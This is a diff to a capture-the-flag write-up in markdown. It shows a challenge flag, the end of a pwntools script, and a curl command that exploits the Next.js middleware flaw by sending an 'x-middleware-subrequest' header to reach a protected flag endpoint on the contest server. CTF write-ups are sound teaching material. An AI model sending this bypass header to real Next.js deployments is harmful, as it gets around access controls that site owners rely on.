@@ -51,7 +51,7 @@ swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
 ![image](https://github.com/user-attachments/assets/7639e47e-e6fb-4373-9cc0-c5fc4bfc6e2d)
 
 - IT The RECENT NEXT.JS VULNERABILITY!!!!
-```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
+- ```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
       
 --------------------------------
 
@@ -87,8 +87,7 @@ p.sendline(b"y")
 print(p.recvall().decode())
 
 # Close connection
-p.close()
-]
+p.close()]
  
 ### Challenge: Beginner Pwn 2
 ![image](https://github.com/user-attachments/assets/cc125998-d69a-423d-b5e8-3bdd7eebf32e)
